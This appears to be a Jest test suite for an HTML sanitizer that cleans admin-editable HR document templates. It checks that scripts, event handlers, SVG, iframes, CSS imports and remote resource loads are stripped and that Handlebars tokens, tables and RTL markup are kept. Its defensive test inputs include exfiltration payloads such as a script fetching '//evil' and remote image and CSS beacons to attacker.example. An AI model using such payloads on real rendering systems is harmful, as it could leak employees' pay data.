import { sanitizeTemplateHtml, TemplateSanitizeError } from './html-sanitizer';

/**
 * Template HTML is authored by an admin and then rendered by a real browser
 * engine in a process that can read salary figures. Every case here is a way
 * that has gone wrong somewhere before.
 */
describe('sanitizeTemplateHtml', () => {
  const clean = (s: string) => sanitizeTemplateHtml(s).html;

  describe('the things that must never survive', () => {
    it('removes a script tag and says it did', () => {
      const res = sanitizeTemplateHtml('<p>hi</p><script>fetch("//evil")</script>');
      expect(res.html).not.toMatch(/<script/i);
      expect(res.html).not.toMatch(/evil/);
      // Reported, not silently dropped: an admin whose block vanished needs to
      // know why rather than concluding the editor is broken.
      expect(res.removed).toContain('<script>');
    });

    it('removes an iframe, an object and a form', () => {
      const res = sanitizeTemplateHtml(
        '<iframe src="//x"></iframe><object data="x"></object><form action="/x"><input name="a"></form>',
      );
      expect(res.html).not.toMatch(/<(iframe|object|form|input)/i);
      expect(res.removed).toEqual(
        expect.arrayContaining(['<iframe>', '<object>', '<form>', '<input>']),
      );
    });

    it('strips event-handler attributes', () => {
      const res = sanitizeTemplateHtml('<div onclick="steal()">x</div>');
      expect(res.html).not.toMatch(/onclick/i);
      expect(res.removed).toContain('event handler attributes');
    });

    it('refuses SVG, which is a scripting surface', () => {
      const res = sanitizeTemplateHtml('<svg><foreignObject><b>x</b></foreignObject></svg>');
      expect(res.html).not.toMatch(/<svg/i);
      expect(res.removed).toContain('<svg>');
    });

    it('drops a remote image src — the exfiltration channel', () => {
      // This is the case the whole file exists for. A template is admin-editable;
      // a remote <img> turns each render into a callback to whoever wrote it,
      // from a process that can see pay data.
      const out = clean('<img src="https://attacker.example/pixel?d=1">');
      expect(out).not.toMatch(/attacker\.example/);
    });

    it('drops a protocol-relative image src too', () => {
      expect(clean('<img src="//attacker.example/p.png">')).not.toMatch(/attacker/);
    });

    it('neutralises url() in CSS unless it is a data URI', () => {
      const out = clean('<style>body{background:url(https://attacker.example/x.png)}</style>');
      expect(out).not.toMatch(/attacker/);
      expect(out).toMatch(/background:none/);
    });

    it('keeps a data: URI in CSS, which is how letterheads are applied', () => {
      const out = clean('<style>html{background-image:url("data:image/png;base64,AAA")}</style>');
      expect(out).toMatch(/data:image\/png;base64,AAA/);
    });

    it('removes @import and expression() from CSS', () => {
      const out = clean('<style>@import url(//x);a{width:expression(alert(1))}</style>');
      expect(out).not.toMatch(/@import/);
      expect(out).not.toMatch(/expression\(/);
    });

    it('refuses <link> and <base>, which reintroduce remote loading', () => {
      const res = sanitizeTemplateHtml('<link rel="stylesheet" href="//x"><base href="//y">');
      expect(res.html).not.toMatch(/<(link|base)/i);
    });
  });

  describe('the things that must survive', () => {
    it('keeps a Handlebars expression exactly as written', () => {
      const out = clean('<p>Dear {{employeeName}}, your code is {{employeeCode}}.</p>');
      expect(out).toContain('{{employeeName}}');
      expect(out).toContain('{{employeeCode}}');
    });

    it('keeps block helpers unmangled', () => {
      // A sanitizer run over raw {{#if}} turns the braces into entities and
      // breaks the template in a way that only shows up at render time.
      const out = clean('{{#if probation}}<p>On probation</p>{{else}}<p>Confirmed</p>{{/if}}');
      expect(out).toContain('{{#if probation}}');
      expect(out).toContain('{{else}}');
      expect(out).toContain('{{/if}}');
    });

    it('keeps an <img src> whose value is a token', () => {
      // The regression this pins: the placeholder used during the HTML pass has
      // to satisfy the img scheme allow-list, or the sanitizer silently drops
      // the src and every template loses its logo.
      const out = clean('<img src="{{companyLogoUrl}}" alt="{{companyName}}">');
      expect(out).toContain('src="{{companyLogoUrl}}"');
    });

    it('keeps an inlined data: image', () => {
      const out = clean('<img src="data:image/png;base64,iVBORw0KGgo=">');
      expect(out).toContain('data:image/png;base64,iVBORw0KGgo=');
    });

    it('keeps tables, which is how every document lays itself out', () => {
      const out = clean(
        '<table><thead><tr><th colspan="2">H</th></tr></thead><tbody><tr><td style="text-align:right">1</td></tr></tbody></table>',
      );
      expect(out).toMatch(/<table>/);
      expect(out).toMatch(/<thead>/);
      expect(out).toMatch(/colspan="2"/);
      expect(out).toMatch(/text-align:right/);
    });

    it('keeps dir and lang, which carry Arabic layout', () => {
      const out = clean('<div dir="rtl" lang="ar"><p>مرحبا</p></div>');
      expect(out).toContain('dir="rtl"');
      expect(out).toContain('lang="ar"');
      expect(out).toContain('مرحبا');
    });
  });

  describe('triple-stash', () => {
    it('is refused outright, with a message that says what to do', () => {
      // Refused rather than rewritten: silently turning {{{x}}} into {{x}}
      // changes what the document says.
      expect(() => sanitizeTemplateHtml('<p>{{{rawHtml}}}</p>')).toThrow(TemplateSanitizeError);
      expect(() => sanitizeTemplateHtml('<p>{{{rawHtml}}}</p>')).toThrow(/Use \{\{ \}\}/);
    });
  });

  it('is idempotent — sanitizing twice changes nothing further', () => {
    // The compiler re-saves a draft on every edit; a sanitizer that mutated its
    // own output would degrade a template a little on each save.
    const src = '<div><p>Hi {{employeeName}}</p><img src="{{companyLogoUrl}}"></div>';
    const once = clean(src);
    expect(clean(once)).toBe(once);
  });
});
